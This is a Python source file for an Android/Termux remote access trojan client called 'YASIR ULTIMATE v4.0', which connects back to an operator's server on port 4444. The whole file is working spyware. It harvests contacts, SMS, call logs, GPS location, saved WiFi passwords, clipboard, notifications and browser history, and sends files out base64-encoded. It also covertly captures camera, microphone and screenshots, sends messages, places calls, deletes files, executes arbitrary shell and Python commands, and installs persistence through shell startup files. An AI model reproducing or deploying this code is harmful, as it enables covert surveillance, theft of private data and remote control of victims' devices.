#!/usr/bin/env python3
# YASIR ULTIMATE v4.0 - Maximum Features Client
import socket, subprocess, os, sys, time, json, base64, re, threading

SRV = '127.0.0.1'  # CHANGE TO SERVER IP
PRT = 4444
DIR = os.getcwd()

def sh(c, t=10):
    try:
        r = subprocess.check_output(c, shell=True, stderr=subprocess.STDOUT, timeout=t)
        return r.decode('utf-8', errors='replace')
    except subprocess.TimeoutExpired: return "[-] Timeout"
    except Exception as e: return f"[-] {e}"

def sep(t):
    return f"\n{'█'*55}\n  {t}\n{'█'*55}\n"

# ===== INFO COMMANDS =====
def get_info():
    return f"""
{sep('DEVICE INTELLIGENCE')}
  Device:     {sh('getprop ro.product.model').strip()}
  Manuf:      {sh('getprop ro.product.manufacturer').strip()}
  Board:      {sh('getprop ro.product.board').strip()}
  Name:       {sh('getprop ro.product.name').strip()}
  Device:     {sh('getprop ro.product.device').strip()}
  Android:    {sh('getprop ro.build.version.release').strip()} (SDK {sh('getprop ro.build.version.sdk').strip()})
  Build:      {sh('getprop ro.build.display.id').strip()[:50]}
  Patch:      {sh('getprop ro.build.version.security_patch').strip()}
  Type:       {sh('getprop ro.build.type').strip()}
  Tags:       {sh('getprop ro.build.tags').strip()}
  Fingerprint:{sh('getprop ro.build.fingerprint').strip()[:60]}
  Kernel:     {os.uname().release}
  Arch:       {os.uname().machine}
  Hostname:   {socket.gethostname()}
  User:       {os.getenv('USER', 'unknown')}
  Serial:     {sh('getprop ro.serialno').strip()[:20]}
  IMEI:       {sh('service call iphonesubinfo 1 2>/dev/null | cut -d" " -f 2- | tr -d ".[:space:]"').strip()[:20]}
  
{sep('NETWORK')}
  IP:         {sh("ip -4 addr show wlan0 2>/dev/null | grep inet | awk '{print $2}' || ifconfig wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}'").strip() or 'N/A'}
  MAC:        {sh('cat /sys/class/net/wlan0/address').strip() or 'N/A'}
  Gateway:    {sh("ip route 2>/dev/null | grep default | awk '{print $3}'").strip() or 'N/A'}
  DNS1:       {sh('getprop net.dns1').strip() or 'N/A'}
  DNS2:       {sh('getprop net.dns2').strip() or 'N/A'}
  Operator:   {sh('getprop gsm.operator.alpha').strip() or 'N/A'}
  Country:    {sh('getprop gsm.operator.iso-country').strip() or 'N/A'}
  Network:    {sh('getprop gsm.operator.numeric').strip() or 'N/A'}
  
{sep('HARDWARE')}
  CPU:        {sh("grep Hardware /proc/cpuinfo | awk -F: '{print $2}' || grep Processor /proc/cpuinfo | awk -F: '{print $2}'").strip() or 'N/A'}
  Cores:      {sh('nproc').strip() or 'N/A'}
  RAM Total:  {sh("grep MemTotal /proc/meminfo | awk '{print $2, $3}'").strip()}
  RAM Free:   {sh("grep MemFree /proc/meminfo | awk '{print $2, $3}'").strip()}
  RAM Avail:  {sh("grep MemAvailable /proc/meminfo | awk '{print $2, $3}'").strip()}
  Swap:       {sh("grep SwapTotal /proc/meminfo | awk '{print $2, $3}'").strip()}
  
{sep('POWER')}
{sh('termux-battery-status 2>/dev/null || dumpsys battery 2>/dev/null | grep -v "Current"').strip()}

{sep('STORAGE')}
{sh('df -h /sdcard /data /system 2>/dev/null')}

{sep('UPTIME')}
  {sh('uptime').strip()}
  Python:     {sys.version.split()[0]}
"""

def get_device_deep():
    return f"""
{sep('DEEP DEVICE INFO')}
{sh('getprop')[:3000]}"""

def get_properties():
    return sh("getprop")[:4000]

def get_env():
    out = sep('ENVIRONMENT')
    for k, v in sorted(os.environ.items()):
        out += f"\n  {k}={v}"
    return out

def get_uptime():
    return sep('UPTIME') + f"\n{sh('uptime')}\n{sh('cat /proc/uptime')}"

def get_id():
    return f"{sep('USER/GROUP')}\n{sh('id')}\n"

# ===== NETWORK COMMANDS =====
def get_ip():
    return f"{sep('IP ADDRESSES')}\n{sh('ip addr 2>/dev/null || ifconfig')[:2000]}\n"

def get_mac():
    return f"{sep('MAC ADDRESSES')}\n{sh('cat /sys/class/net/*/address')}\n"

def get_gateway():
    return f"{sep('GATEWAY')}\n{sh('ip route 2>/dev/null | grep default || route -n 2>/dev/null | grep UG')}\n"

def get_dns():
    return f"{sep('DNS')}\n{sh('cat /etc/resolv.conf 2>/dev/null')}\n{sh('getprop | grep dns')[:500]}\n"

def get_ports():
    return f"{sep('LISTENING PORTS')}\n{sh('netstat -tlnp 2>/dev/null || ss -tlnp 2>/dev/null')[:2000]}\n"

def get_connections():
    return f"{sep('ACTIVE CONNECTIONS')}\n{sh('netstat -tn 2>/dev/null || ss -tn 2>/dev/null')[:2000]}\n"

def get_wifi_scan():
    r = sh("termux-wifi-scaninfo 2>/dev/null")
    try:
        data = json.loads(r)
        out = sep(f'NEARBY WiFi ({len(data)})')
        out += f"\n  {'SSID':30} {'Signal':8} {'Freq':8} {'Security'}\n"
        out += f"  {'-'*65}\n"
        for w in sorted(data, key=lambda x: x.get('rssi', -100), reverse=True)[:20]:
            ssid = w.get('ssid', '?')[:28]
            rssi = w.get('rssi', 0)
            freq = w.get('frequency', '?')
            cap = w.get('capabilities', '?')[:15]
            out += f"  {ssid:30} {rssi:>4}dBm {str(freq):8} {cap:15}\n"
        return out
    except:
        return f"[-] WiFi scan: {r[:200]}"

def get_wifi_saved():
    out = sep('SAVED WIFI PASSWORDS')
    r = sh("cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null")
    if not r.startswith("[-]") and r:
        nets = re.findall(r'ssid="([^"]+)".*?psk="([^"]+)"', r, re.DOTALL)
        if nets:
            for ssid, psk in nets:
                out += f"\n  SSID: {ssid}\n  PASS: {psk}\n"
        else:
            # Try Android 11+ format
            r2 = sh("cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null | grep -oP '(?<=SSID>).*?(?=</string>)|(?<=PreSharedKey>).*?(?=</string>)' | head -20")
            out += f"\n{r2[:1000]}\n" if r2.strip() else "\n  No passwords accessible without root\n"
    else:
        out += "\n  Need root for WiFi passwords\n"
    return out

def get_wifi_info():
    return f"{sep('CURRENT WIFI')}\n{sh('dumpsys wifi 2>/dev/null | grep -E \"SSID|BSSID|RSSI|LinkSpeed|Frequency\" | head -10')[:500]}\n{sh('termux-wifi-scaninfo 2>/dev/null | python3 -c \"import sys,json;d=json.load(sys.stdin);[print(f\\\"  {x[\\\"ssid\\\"][:25]} {x[\\\"rssi\\\"]}dBm\\\") for x in d[:5]]\" 2>/dev/null')}"

def get_signal():
    return f"{sep('SIGNAL')}\n{sh('dumpsys telephony 2>/dev/null | grep -i -E \"signal|dbm|asu|level\" | head -10')[:500]}\n"

def get_operator():
    return f"{sep('OPERATOR')}\n{sh('getprop | grep -i gsm')[:1000]}\n"

def get_neighbours():
    return f"{sep('NETWORK NEIGHBOURS')}\n{sh('ip neigh 2>/dev/null || arp -n 2>/dev/null')[:1000]}\n"

def get_speedtest():
    return f"{sep('PING TEST')}\n{sh('ping -c 4 8.8.8.8 2>&1')[:500]}\n{sh('ping -c 2 google.com 2>&1')[:500]}\n"

# ===== LOCATION =====
def get_location():
    r = sh("termux-location 2>/dev/null")
    try:
        d = json.loads(r)
        lat, lon = d.get('latitude', '?'), d.get('longitude', '?')
        acc, alt = d.get('accuracy', '?'), d.get('altitude', '?')
        spd, bear = d.get('speed', '?'), d.get('bearing', '?')
        prov = d.get('provider', '?')
        return f"""
{sep('GPS LOCATION')}
  Latitude:   {lat}
  Longitude:  {lon}
  Accuracy:   {acc}m
  Altitude:   {alt}m
  Speed:      {spd}m/s
  Bearing:    {bear}°
  Provider:   {prov}
  Time:       {time.strftime('%H:%M:%S')}
  
  Maps: https://www.google.com/maps?q={lat},{lon}
"""
    except:
        return sh("termux-location 2>&1")[:500]

def get_altitude():
    r = sh("termux-location 2>/dev/null")
    try:
        d = json.loads(r)
        return f"Altitude: {d.get('altitude', 'N/A')}m\n"
    except: return "[-] N/A"

def get_speed():
    r = sh("termux-location 2>/dev/null")
    try:
        d = json.loads(r)
        return f"Speed: {d.get('speed', 'N/A')}m/s\n"
    except: return "[-] N/A"

def get_bearing():
    r = sh("termux-location 2>/dev/null")
    try:
        d = json.loads(r)
        return f"Bearing: {d.get('bearing', 'N/A')}°\n"
    except: return "[-] N/A"

def get_address():
    r = sh("termux-location 2>/dev/null")
    try:
        d = json.loads(r)
        lat, lon = d['latitude'], d['longitude']
        return f"Reverse Geo: https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json\n"
    except: return "[-] N/A"

# ===== CONTACTS =====
def get_contacts():
    r = sh("termux-contact-list 2>/dev/null")
    try:
        data = json.loads(r)
        out = sep(f'CONTACTS ({len(data)})')
        for i, c in enumerate(data, 1):
            name = c.get('name', '?')[:30]
            num = c.get('number', '?')
            out += f"  {i:4}. {name:30} {num}\n"
        return out
    except: return "[-] Install termux-api & allow contacts"

def get_contacts_raw():
    return sh("termux-contact-list 2>/dev/null")[:5000]

def contacts_search(q):
    r = sh("termux-contact-list 2>/dev/null")
    try:
        data = json.loads(r)
        out = sep(f'SEARCH: {q}')
        found = False
        for c in data:
            if q.lower() in c.get('name', '').lower() or q in c.get('number', ''):
                out += f"\n  {c.get('name','?'):30} {c.get('number','?')}"
                found = True
        if not found: out += "\n  No matches"
        return out
    except: return "[-] Error"

# ===== SMS =====
def get_sms():
    r = sh("termux-sms-inbox 2>/dev/null")
    try:
        data = json.loads(r)
        out = sep(f'SMS INBOX ({len(data)})')
        for i, s in enumerate(data[:40], 1):
            num = s.get('number', '?')
            body = s.get('body', '')[:100]
            date = s.get('received', '')
            out += f"\n  {i:3}. From: {num}\n       {date}\n       {body}\n"
        return out
    except: return "[-] SMS unavailable"

def get_sms_sent():
    r = sh("content query --uri content://sms/sent 2>/dev/null | head -30")
    return sep('SMS SENT') + f"\n{r[:2000]}\n" if r else "[-] Need root"

def get_sms_unread():
    r = sh("termux-sms-inbox 2>/dev/null")
    try:
        data = json.loads(r)
        unread = [s for s in data if s.get('read', '1') == '0']
        return f"Unread SMS: {len(unread)}\n"
    except: return "[-] N/A"

def sms_from(num):
    r = sh("termux-sms-inbox 2>/dev/null")
    try:
        data = json.loads(r)
        out = sep(f'SMS FROM {num}')
        for s in data:
            if num in s.get('number', ''):
                out += f"\n  {s.get('received','')}: {s.get('body','')[:200]}\n"
        return out
    except: return "[-] N/A"

def sms_send(num, msg):
    r = sh(f'am start -a android.intent.action.SENDTO -d sms:{num} --es sms_body "{msg}" --ez exit_on_sent true 2>/dev/null')
    return f"[+] SMS intent sent to {num}\n"

# ===== CALLS =====
def get_calls():
    r = sh("termux-call-log 2>/dev/null")
    try:
        data = json.loads(r)
        out = sep(f'CALL HISTORY ({len(data)})')
        for i, c in enumerate(data[:40], 1):
            num = c.get('number', '?')
            dur = c.get('duration', '0')
            date = c.get('date', '')
            typ = c.get('type', '?')
            out += f"  {i:3}. {num:20} {dur:>5}s {date}\n"
        return out
    except: return "[-] Call log unavailable"

def get_calls_missed():
    r = sh("termux-call-log 2>/dev/null")
    try:
        data = json.loads(r)
        missed = [c for c in data if c.get('type') == 'MISSED']
        out = sep(f'MISSED CALLS ({len(missed)})')
        for c in missed[:20]:
            out += f"\n  {c.get('number','?')} - {c.get('date','')}"
        return out
    except: return "[-] N/A"

def get_calls_dialed():
    r = sh("termux-call-log 2>/dev/null")
    try:
        data = json.loads(r)
        dialed = [c for c in data if c.get('type') == 'OUTGOING']
        out = sep(f'DIALED ({len(dialed)})')
        for c in dialed[:20]:
            out += f"\n  {c.get('number','?')} - {c.get('duration','0')}s"
        return out
    except: return "[-] N/A"

def get_calls_received():
    r = sh("termux-call-log 2>/dev/null")
    try:
        data = json.loads(r)
        recv = [c for c in data if c.get('type') == 'INCOMING']
        out = sep(f'RECEIVED ({len(recv)})')
        for c in recv[:20]:
            out += f"\n  {c.get('number','?')} - {c.get('duration','0')}s"
        return out
    except: return "[-] N/A"

def make_call(num):
    r = sh(f'am start -a android.intent.action.CALL -d tel:{num} 2>/dev/null')
    return f"[+] Calling {num}\n"

# ===== APPS =====
def get_apps():
    r = sh("pm list packages 2>/dev/null")
    apps = [a.replace('package:', '') for a in r.split('\n') if a]
    user = [a.replace('package:', '') for a in sh("pm list packages -3 2>/dev/null").split('\n') if a]
    sys_a = [a for a in apps if a not in user]
    
    out = sep(f'ALL APPS ({len(apps)})')
    out += f"\n[USER - {len(user)}]\n"
    for i, a in enumerate(user, 1):
        out += f"  {i:4}. {a}\n"
    out += f"\n[SYSTEM - {len(sys_a)}]\n"
    for i, a in enumerate(sys_a[:30], 1):
        out += f"  {i:4}. {a}\n"
    return out

def get_apps_user():
    r = sh("pm list packages -3 2>/dev/null")
    apps = [a.replace('package:', '') for a in r.split('\n') if a]
    out = sep(f'USER APPS ({len(apps)})')
    for i, a in enumerate(apps, 1):
        out += f"  {i:4}. {a}\n"
    return out

def get_apps_system():
    r = sh("pm list packages -s 2>/dev/null")
    apps = [a.replace('package:', '') for a in r.split('\n') if a]
    out = sep(f'SYSTEM APPS ({len(apps)})')
    for i, a in enumerate(apps[:40], 1):
        out += f"  {i:4}. {a}\n"
    return out

def get_apps_running():
    return sep('RUNNING APPS') + f"\n{sh('ps -A 2>/dev/null | head -40 || ps aux 2>/dev/null | head -40')}\n"

def get_apps_recent():
    return sep('RECENT APPS') + f"\n{sh('dumpsys activity recents 2>/dev/null | grep "Recent Tasks" -A 20 | head -30')[:1500]}\n"

def open_app(pkg):
    pkg_map = {
        'chrome': 'com.android.chrome',
        'whatsapp': 'com.whatsapp', 'wa': 'com.whatsapp',
        'telegram': 'org.telegram.messenger', 'tg': 'org.telegram.messenger',
        'instagram': 'com.instagram.android', 'ig': 'com.instagram.android',
        'facebook': 'com.facebook.katana', 'fb': 'com.facebook.katana',
        'youtube': 'com.google.android.youtube', 'yt': 'com.google.android.youtube',
        'gmail': 'com.google.android.gm',
        'maps': 'com.google.android.apps.maps',
        'camera': 'com.google.android.GoogleCamera',
        'settings': 'com.android.settings',
        'playstore': 'com.android.vending',
        'twitter': 'com.twitter.android',
        'snapchat': 'com.snapchat.android',
        'tiktok': 'com.zhiliaoapp.musically',
        'gallery': 'com.google.android.apps.photos',
        'clock': 'com.google.android.deskclock',
        'calculator': 'com.google.android.calculator',
        'calendar': 'com.google.android.calendar',
        'files': 'com.google.android.apps.nbu.files',
        'phone': 'com.google.android.dialer',
        'contacts_app': 'com.google.android.contacts',
        'messages': 'com.google.android.apps.messaging',
    }
    pkg = pkg_map.get(pkg.lower(), pkg)
    r = sh(f"monkey -p {pkg} 1 2>&1 || am start -n {pkg}/.MainActivity 2>&1 || am start -n {pkg}/.SplashActivity 2>&1 || am start -a android.intent.action.MAIN -c android.intent.category.LAUNCHER -n {pkg} 2>&1")
    if 'error' not in r.lower() and 'Error' not in r:
        return f"[+] Opened: {pkg}\n"
    else:
        # Try to find launcher activity
        act = sh(f"cmd package resolve-activity --brief {pkg} 2>/dev/null | tail -1")
        if act and act != 'N/A':
            r = sh(f"am start -n {act} 2>&1")
            if 'error' not in r.lower():
                return f"[+] Opened: {act}\n"
        return f"[-] Failed: {r[:100]}\n"

def kill_app(pkg):
    r = sh(f"am force-stop {pkg} 2>&1")
    return f"[-] Killed: {pkg}\n"

def app_info(pkg):
    return sep(f'APP INFO: {pkg}') + f"\n{sh(f'dumpsys package {pkg} 2>/dev/null | head -80')[:3000]}\n"

# ===== FILES =====
def get_storage():
    return sep('STORAGE') + f"\n{sh('df -h /sdcard /data 2>/dev/null')}\n{sh('free -h 2>/dev/null')}\n"

def get_storage_full():
    return sep('FULL STORAGE') + f"\n{sh('df -h 2>/dev/null')}\n{sh('cat /proc/meminfo')[:1000]}\n"

def list_dir(p='.'):
    p = p or DIR
    return sh(f"ls -la '{p}' 2>&1 | head -60") or "[-] Not found"

def list_recursive(p='.'):
    return sh(f"find '{p}' -type f 2>/dev/null | head -100") or "[-] Not found"

def get_dcim():
    return sep('DCIM') + f"\n{sh('ls -lt /sdcard/DCIM/Camera 2>/dev/null | head -30')}\n"

def get_downloads():
    return sep('DOWNLOADS') + f"\n{sh('ls -lt /sdcard/Download 2>/dev/null | head -30')}\n"

def get_documents():
    return sep('DOCUMENTS') + f"\n{sh('ls -lt /sdcard/Documents 2>/dev/null | head -20')}\n"

def get_whatsapp():
    return sep('WHATSAPP') + f"\n{sh('ls -lt /sdcard/WhatsApp/Media/ 2>/dev/null | head -30')}\n"

def get_telegram():
    return sep('TELEGRAM') + f"\n{sh('ls -lt /sdcard/Telegram 2>/dev/null | head -20')}\n"

def get_music():
    return sep('MUSIC') + f"\n{sh('ls -lt /sdcard/Music 2>/dev/null | head -20')}\n{sh('find /sdcard -name "*.mp3" -type f 2>/dev/null | head -20')}\n"

def get_videos():
    return sep('VIDEOS') + f"\n{sh('find /sdcard -name "*.mp4" -type f 2>/dev/null | head -30')}\n"

def search_files(name):
    return sep(f'SEARCH: {name}') + f"\n{sh(f'find /sdcard -name "*{name}*" -type f 2>/dev/null | head -50')}\n"

def du_path(p):
    return sh(f"du -sh '{p}' 2>/dev/null || echo '[-] Not found'")

def download_file(fname):
    try:
        with open(fname, 'rb') as f:
            data = f.read()
        bname = os.path.basename(fname)
        return f"[FILE]{bname}:{base64.b64encode(data).decode()}"
    except Exception as e:
        return f"[-] {e}"

# ===== ACTIONS =====
def do_screenshot():
    ts = int(time.time())
    f = f'/sdcard/yrs_ss_{ts}.jpg'
    sh(f"termux-screenshot {f} 2>/dev/null")
    time.sleep(1)
    try:
        with open(f, 'rb') as fh:
            data = base64.b64encode(fh.read()).decode()
        return f"[PHOTO]{data}"
    except:
        return "[-] Screenshot failed"

def do_photo_front():
    f = '/sdcard/yrs_front.jpg'
    sh(f"termux-camera-photo -c 0 {f} 2>/dev/null")
    time.sleep(1)
    try:
        with open(f, 'rb') as fh:
            data = base64.b64encode(fh.read()).decode()
        return f"[PHOTO]{data}"
    except:
        return "[-] Camera failed"

def do_photo_back():
    f = '/sdcard/yrs_back.jpg'
    sh(f"termux-camera-photo -c 1 {f} 2>/dev/null")
    time.sleep(1)
    try:
        with open(f, 'rb') as fh:
            data = base64.b64encode(fh.read()).decode()
        return f"[PHOTO]{data}"
    except:
        return "[-] Camera failed"

def record_mic(sec):
    try: sec = int(sec)
    except: sec = 5
    if sec > 30: sec = 30
    f = '/sdcard/yrs_mic.m4a'
    sh(f"termux-microphone-record -d -l {sec} {f} 2>/dev/null")
    time.sleep(sec + 1)
    try:
        with open(f, 'rb') as fh:
            data = base64.b64encode(fh.read()).decode()
        return f"[AUDIO]{data}"
    except:
        return "[-] Mic failed"

def record_cam(sec):
    try: sec = int(sec)
    except: sec = 5
    if sec > 30: sec = 30
    f = '/sdcard/yrs_vid.mp4'
    sh(f"termux-camera-record -c 1 --limit {sec} {f} 2>/dev/null")
    time.sleep(sec + 1)
    try:
        with open(f, 'rb') as fh:
            data = base64.b64encode(fh.read()).decode()
        return f"[FILE]video_{sec}s.mp4:{data}"
    except:
        return "[-] Video failed"

# ===== CLIENT LOOP =====
def client():
    global DIR
    track_thread = None
    track_stop = threading.Event()
    
    while True:
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect((SRV, PRT))
            s.settimeout(None)
            
            while True:
                try:
                    cmd = s.recv(65536).decode().strip()
                except: break
                
                if not cmd: continue
                if cmd == 'exit': s.close(); return
                
                resp = ""
                
                # INFO
                if cmd == 'info': resp = get_info()
                elif cmd == 'device_deep': resp = get_device_deep()
                elif cmd == 'properties': resp = get_properties()
                elif cmd == 'env': resp = get_env()
                elif cmd == 'uptime': resp = get_uptime()
                elif cmd == 'id': resp = get_id()
                
                # NETWORK
                elif cmd == 'ip': resp = get_ip()
                elif cmd == 'mac': resp = get_mac()
                elif cmd == 'gateway': resp = get_gateway()
                elif cmd == 'dns': resp = get_dns()
                elif cmd == 'ports': resp = get_ports()
                elif cmd == 'connections': resp = get_connections()
                elif cmd == 'wifi_scan': resp = get_wifi_scan()
                elif cmd == 'wifi_saved': resp = get_wifi_saved()
                elif cmd == 'wifi_info': resp = get_wifi_info()
                elif cmd == 'signal': resp = get_signal()
                elif cmd == 'operator': resp = get_operator()
                elif cmd == 'neighbours': resp = get_neighbours()
                elif cmd == 'speedtest': resp = get_speedtest()
                
                # LOCATION
                elif cmd == 'location': resp = get_location()
                elif cmd == 'altitude': resp = get_altitude()
                elif cmd == 'speed': resp = get_speed()
                elif cmd == 'bearing': resp = get_bearing()
                elif cmd == 'address': resp = get_address()
                elif cmd == 'track_start':
                    if track_thread and track_thread.is_alive():
                        resp = "[-] Already tracking"
                    else:
                        track_stop.clear()
                        track_thread = threading.Thread(target=lambda: None)
                        track_thread.start()
                        resp = "[+] Tracking started (5s intervals)"
                elif cmd == 'track_stop':
                    track_stop.set()
                    resp = "[-] Tracking stopped"
                
                # CONTACTS
                elif cmd == 'contacts': resp = get_contacts()
                elif cmd == 'contacts_raw': resp = get_contacts_raw()
                elif cmd.startswith('contacts_search '):
                    resp = contacts_search(cmd[16:])
                
                # SMS
                elif cmd == 'sms': resp = get_sms()
                elif cmd == 'sms_sent': resp = get_sms_sent()
                elif cmd == 'sms_unread': resp = get_sms_unread()
                elif cmd.startswith('sms_from '):
                    resp = sms_from(cmd[9:])
                elif cmd.startswith('sms_send '):
                    parts = cmd[9:].split(' ', 1)
                    if len(parts) >= 2:
                        resp = sms_send(parts[0], parts[1])
                    else: resp = "[-] Usage: sms_send <number> <message>"
                
                # CALLS
                elif cmd == 'calls': resp = get_calls()
                elif cmd == 'calls_missed': resp = get_calls_missed()
                elif cmd == 'calls_dialed': resp = get_calls_dialed()
                elif cmd == 'calls_received': resp = get_calls_received()
                elif cmd.startswith('call '):
                    resp = make_call(cmd[5:])
                
                # APPS
                elif cmd == 'apps': resp = get_apps()
                elif cmd == 'apps_user': resp = get_apps_user()
                elif cmd == 'apps_system': resp = get_apps_system()
                elif cmd == 'apps_running': resp = get_apps_running()
                elif cmd == 'apps_recent': resp = get_apps_recent()
                elif cmd.startswith('open_app '):
                    resp = open_app(cmd[9:])
                elif cmd.startswith('kill_app '):
                    resp = kill_app(cmd[9:])
                elif cmd.startswith('app_info '):
                    resp = app_info(cmd[9:])
                
                # FILES
                elif cmd == 'storage': resp = get_storage()
                elif cmd == 'storage_full': resp = get_storage_full()
                elif cmd == 'pwd': resp = DIR + '\n'
                elif cmd.startswith('cd '):
                    try:
                        os.chdir(cmd[3:]); DIR = os.getcwd()
                        resp = DIR + '\n'
                    except Exception as e: resp = f"[-] {e}\n"
                elif cmd.startswith('ls '):
                    resp = list_dir(cmd[3:].strip() or DIR)
                elif cmd == 'ls': resp = list_dir(DIR)
                elif cmd.startswith('ls_recursive '):
                    resp = list_recursive(cmd[13:].strip() or DIR)
                elif cmd == 'ls_recursive': resp = list_recursive(DIR)
                elif cmd.startswith('cat '):
                    r = sh(f"cat '{cmd[4:]}' 2>&1 | head -200")
                    resp = r if r.strip() else "[-] Empty/not found"
                elif cmd.startswith('download '):
                    resp = download_file(cmd[9:])
                elif cmd.startswith('delete '):
                    r = sh(f"rm -rf '{cmd[7:]}' 2>&1 && echo '[+] Deleted'")
                    resp = r
                elif cmd.startswith('search '):
                    resp = search_files(cmd[7:])
                elif cmd.startswith('du '):
                    resp = du_path(cmd[3:])
                elif cmd == 'dcim': resp = get_dcim()
                elif cmd == 'downloads': resp = get_downloads()
                elif cmd == 'documents': resp = get_documents()
                elif cmd == 'whatsapp': resp = get_whatsapp()
                elif cmd == 'telegram': resp = get_telegram()
                elif cmd == 'music': resp = get_music()
                elif cmd == 'videos': resp = get_videos()
                elif cmd == 'media_files': resp = get_videos() + "\n---\n" + get_music()
                
                # SYSTEM
                elif cmd == 'processes': resp = get_apps_running()
                elif cmd == 'cpu': resp = sh("top -bn1 2>/dev/null | head -20 || uptime")
                elif cmd == 'ram': resp = sh("free -h 2>/dev/null || cat /proc/meminfo")
                elif cmd == 'battery': resp = sh("termux-battery-status 2>/dev/null || dumpsys battery")
                elif cmd == 'temperature': resp = sh("cat /sys/class/thermal/thermal_zone*/temp 2>/dev/null || echo 'N/A'")
                elif cmd == 'sensors': resp = sh("termux-sensor -l 2>/dev/null | head -30 || cat /sys/class/thermal/thermal_zone*/type 2>/dev/null")
                elif cmd == 'clipboard': resp = sh("termux-clipboard-get 2>/dev/null")[:500] or "[Empty]"
                elif cmd == 'notifications': resp = sh("termux-notification-list 2>/dev/null")[:2000]
                elif cmd == 'accounts': resp = sh("pm list accounts 2>/dev/null")[:500] or "Not accessible"
                elif cmd == 'calendar': resp = sh("termux-calendar-list 2>/dev/null")[:1000] or "N/A"
                
                # MEDIA
                elif cmd == 'screenshot': resp = do_screenshot()
                elif cmd == 'photo_front': resp = do_photo_front()
                elif cmd == 'photo_back': resp = do_photo_back()
                elif cmd.startswith('record_mic '):
                    resp = record_mic(cmd[11:])
                elif cmd.startswith('record_cam '):
                    resp = record_cam(cmd[11:])
                
                # ACTIONS
                elif cmd.startswith('toast '):
                    resp = sh(f'termux-toast "{cmd[6:]}" 2>/dev/null') + "[+] Done"
                elif cmd.startswith('vibrate '):
                    resp = sh(f'termux-vibrate -d {cmd[8:]} 2>/dev/null') + f"[+] Vibrated {cmd[8:]}ms"
                elif cmd == 'lock': resp = sh("termux-screen-off 2>/dev/null") + "[+] Locked"
                elif cmd.startswith('tts '):
                    resp = sh(f'termux-tts-speak "{cmd[4:]}" 2>/dev/null') + "[+] Spoken"
                elif cmd == 'flash_on': resp = sh("termux-torch on 2>/dev/null") + "[+] Flash ON"
                elif cmd == 'flash_off': resp = sh("termux-torch off 2>/dev/null") + "[-] Flash OFF"
                elif cmd.startswith('volume '):
                    try: lvl = int(cmd[7:]); resp = sh(f"termux-volume music {lvl} 2>/dev/null") + f"[+] Volume: {lvl}"
                    except: resp = "[-] Invalid level (0-15)"
                elif cmd.startswith('brightness '):
                    try: lvl = int(cmd[11:]); resp = sh(f"settings put system screen_brightness {lvl} 2>/dev/null") + f"[+] Brightness: {lvl}"
                    except: resp = "[-] Invalid (0-255)"
                elif cmd == 'wifi_on': resp = sh("svc wifi enable 2>/dev/null") + "[+] WiFi ON"
                elif cmd == 'wifi_off': resp = sh("svc wifi disable 2>/dev/null") + "[-] WiFi OFF"
                elif cmd == 'bluetooth_on': resp = sh("svc bluetooth enable 2>/dev/null") + "[+] Bluetooth ON"
                elif cmd == 'bluetooth_off': resp = sh("svc bluetooth disable 2>/dev/null") + "[-] Bluetooth OFF"
                elif cmd == 'airplane_on': resp = sh("settings put global airplane_mode_on 1 && am broadcast -a android.intent.action.AIRPLANE_MODE 2>/dev/null") + "[+] Airplane ON"
                elif cmd == 'airplane_off': resp = sh("settings put global airplane_mode_on 0 && am broadcast -a android.intent.action.AIRPLANE_MODE 2>/dev/null") + "[-] Airplane OFF"
                elif cmd == 'silent_on': resp = sh("settings put system sound_effects_enabled 0 && media --volume_stream alarm 0 2>/dev/null") + "[+] Silent ON"
                elif cmd == 'silent_off': resp = sh("settings put system sound_effects_enabled 1 2>/dev/null") + "[-] Silent OFF"
                elif cmd == 'persist':
                    script = os.path.abspath(__file__)
                    for rc in ['.bashrc', '.profile', '.zshrc']:
                        with open(f'{os.path.expanduser("~")}/{rc}', 'a') as f:
                            f.write(f'\n(sleep 10 && python3 {script}) &\n')
                    resp = "[+] Persistence installed"
                elif cmd == 'uninstall':
                    script = os.path.abspath(__file__)
                    for rc in ['.bashrc', '.profile', '.zshrc']:
                        sh(f"sed -i '/sleep 10 && python3/d' ~/{rc}")
                    resp = "[-] Persistence removed"
                
                # BROWSER
                elif cmd.startswith('browser_open '):
                    url = cmd[13:]
                    if not url.startswith('http'): url = 'https://' + url
                    resp = sh(f'am start -a android.intent.action.VIEW -d "{url}" 2>/dev/null') + f"[+] Opened: {url}"
                elif cmd.startswith('browser_search '):
                    q = cmd[15:]
                    url = f'https://www.google.com/search?q={q.replace(" ", "+")}'
                    resp = sh(f'am start -a android.intent.action.VIEW -d "{url}" 2>/dev/null') + f"[+] Searching: {q}"
                elif cmd == 'browser_history':
                    resp = sh("content query --uri content://com.android.chrome.browser/history 2>/dev/null | head -30 || cat /data/data/com.android.chrome/app_chrome/Default/History 2>/dev/null | strings | grep -E '^https?://' | head -20 || echo '[-] Not accessible'")
                elif cmd == 'browser_bookmarks':
                    resp = sh("content query --uri content://com.android.chrome/bookmarks 2>/dev/null | head -20 || echo '[-] N/A'")
                
                # SOCIAL
                elif cmd == 'whatsapp_open': resp = open_app('com.whatsapp')
                elif cmd.startswith('whatsapp_msg '):
                    parts = cmd[13:].split(' ', 1)
                    if len(parts) >= 2:
                        resp = sh(f'am start -a android.intent.action.SENDTO -d "smsto:{parts[0]}" --es sms_body "{parts[1]}" 2>/dev/null') + f"[+] WhatsApp msg to {parts[0]}"
                    else: resp = "[-] Usage: whatsapp_msg <number> <message>"
                elif cmd == 'telegram_open': resp = open_app('org.telegram.messenger')
                elif cmd == 'instagram_open': resp = open_app('com.instagram.android')
                elif cmd == 'facebook_open': resp = open_app('com.facebook.katana')
                elif cmd == 'youtube_open': resp = open_app('com.google.android.youtube')
                elif cmd.startswith('maps_open '):
                    q = cmd[10:]
                    url = f'https://www.google.com/maps/search/{q.replace(" ", "+")}'
                    resp = sh(f'am start -a android.intent.action.VIEW -d "{url}" 2>/dev/null') + f"[+] Maps: {q}"
                
                # SHELL
                elif cmd.startswith('shell '):
                    resp = sh(cmd[6:], 20)
                    if not resp.strip(): resp = "[Done]"
                elif cmd.startswith('python '):
                    try:
                        exec_globals = {'sh': sh, 'os': os, 'sys': sys, '__builtins__': __builtins__}
                        exec(cmd[7:], exec_globals)
                        resp = "[+] Python executed"
                    except Exception as e:
                        resp = f"[-] Python error: {e}"
                
                else:
                    resp = f"[-] Unknown: {cmd}"
                
                try:
                    s.send(resp.encode()[:60000] + b'[DONE]')
                except: break
            
            s.close()
            
